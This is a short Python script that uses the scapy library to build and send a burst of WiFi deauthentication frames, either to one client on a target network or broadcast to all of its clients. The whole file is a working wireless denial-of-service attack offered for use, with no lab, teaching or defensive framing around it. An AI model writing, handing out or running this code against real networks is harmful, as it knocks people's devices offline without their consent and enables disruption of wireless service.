from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth_attack(interface, bssid, client):
    """
    Sends deauthentication packets to a client or broadcast.

    Args:
        interface (str): Network interface in monitor mode.
        bssid (str): Target WiFi network BSSID.
        client (str): Target client MAC address (use FF:FF:FF:FF:FF:FF for broadcast).
    """
    print(f"[*] Sending deauthentication packets to client: {client} on BSSID: {bssid}")
    try:
        # Construct deauth packet
        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        sendp(pkt, iface=interface, count=100, inter=0.1, verbose=1)
    except Exception as e:
        print(f"[!] Error: {e}")
